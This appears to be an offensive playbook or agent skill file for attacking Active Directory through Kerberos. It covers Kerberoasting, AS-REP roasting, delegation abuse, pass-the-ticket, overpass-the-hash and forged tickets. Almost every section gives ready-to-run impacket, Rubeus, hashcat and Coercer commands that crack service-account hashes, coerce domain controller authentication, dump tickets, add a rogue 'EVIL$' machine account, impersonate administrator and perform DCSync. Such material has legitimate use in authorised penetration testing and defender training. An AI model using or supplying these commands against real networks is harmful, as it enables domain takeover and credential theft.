# Kerberos Attacks — Roasting, Delegation, Ticket Forgery

---

## Kerberoasting

Request TGS for any SPN-set user → crack RC4 ticket offline. No special privilege needed.

```bash
# impacket (Linux)
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc_ip> -request -outputfile kerberoast.txt
impacket-GetUserSPNs domain.local/user -hashes :NTLM -dc-ip <dc_ip> -request  # pass-the-hash

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
.\Rubeus.exe kerberoast /user:<specific_user> /format:hashcat  # targeted

# Crack (hashcat mode 13100 = RC4; mode 19700 = AES256)
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
hashcat -m 19700 kerberoast.txt rockyou.txt   # if AES256 enforced

# High-value targets: look for admincount=1 SPN accounts
Get-DomainUser -SPN | Where admincount -eq 1 | Select samaccountname, serviceprincipalname
```

**RC4 vs AES256**: RC4 (etype 23) cracks faster; AES256 (etype 18) much slower. If target enforces AES, crack time increases significantly. Check: `Get-DomainUser -SPN -Properties msDS-SupportedEncryptionTypes`.

---

## AS-REP Roasting

Users with `DONT_REQ_PREAUTH` flag set expose encrypted TGT without authentication.

```bash
# impacket — no creds needed if user list known
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt

# impacket — with creds (auto-enumerate from LDAP)
impacket-GetNPUsers domain.local/user:pass -dc-ip <dc_ip> -request -format hashcat

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack (hashcat mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## Unconstrained Delegation abuse

Computer/service configured with unconstrained delegation stores incoming TGTs in memory. If you control that machine, extract any TGT that authenticated to it — including DC machine account (→ DCSync).

```bash
# Find unconstrained delegation computers
Get-DomainComputer -Unconstrained | Select dnshostname

# If you have code execution on unconstrained machine:
# Coerce DC authentication → DC TGT lands in memory on compromised host
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <unconstrained_host>

# Extract TGT from memory (Rubeus on compromised host)
.\Rubeus.exe triage          # list tickets
.\Rubeus.exe dump /luid:<LUID> /nowrap    # dump DC ticket

# Import and use
.\Rubeus.exe ptt /ticket:<base64>
# OR on Linux:
echo "<base64>" | base64 -d > dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>  # DCSync
```

---

## Constrained Delegation abuse

Service configured for constrained delegation can request S4U2Proxy TGS on behalf of any user for specific target services — even Domain Admin.

```bash
# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth | Select samaccountname, msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth | Select dnshostname, msDS-AllowedToDelegateTo

# If you have control of delegated service account:
# impacket — S4U2Self + S4U2Proxy
impacket-getST -spn <allowed_spn> domain.local/svc_account:pass -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@<target>

# Rubeus S4U (Windows)
.\Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:administrator /msdsspn:<allowed_spn> /ptt
```

---

## Resource-Based Constrained Delegation (RBCD)

If you have `GenericWrite`/`GenericAll` on a computer object → add controlled computer account to `msDS-AllowedToActOnBehalfOfOtherIdentity` → impersonate any user to that computer.

```bash
# Step 1: Create new machine account (or use existing controlled account)
impacket-addcomputer domain.local/user:pass -computer-name EVIL$ -computer-pass 'Evil123!'

# Step 2: Set RBCD attribute (PowerView or impacket)
# PowerView:
$SID = Get-DomainComputer EVIL$ | Select -ExpandProperty objectsid
Set-DomainObject -Identity <target_computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=...}

# Step 3: Get S4U TGS impersonating DA
impacket-getST -spn cifs/<target> domain.local/EVIL$:'Evil123!' -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@<target>
```

---

## Pass-the-Ticket

```bash
# Import .kirbi ticket (from Rubeus dump)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Import directly via Rubeus (Windows in-memory)
.\Rubeus.exe ptt /ticket:<base64>
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show   # spawn process with ticket

# List current tickets
.\Rubeus.exe triage
klist   # Windows built-in
```

---

## Overpass-the-Hash (Pass-the-Key)

Convert NTLM hash → Kerberos TGT. Useful when NTLM is blocked but Kerberos is allowed.

```bash
# impacket
impacket-getTGT domain.local/user -hashes :NTLM -dc-ip <dc_ip>
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Rubeus (Windows)
.\Rubeus.exe asktgt /user:user /rc4:<NTLM> /ptt
.\Rubeus.exe asktgt /user:user /aes256:<AES256_KEY> /ptt  # preferred (less noisy)
```

---

## Golden and Silver Ticket

See `active-directory-technique` SKILL.md §Phase 6.

Key material:
- **Golden**: `krbtgt` NTLM hash + domain SID → forge any TGT
- **Silver**: service account NTLM hash + domain SID → forge TGS for that service

Golden ticket persists even after password reset (krbtgt needs two resets to invalidate).
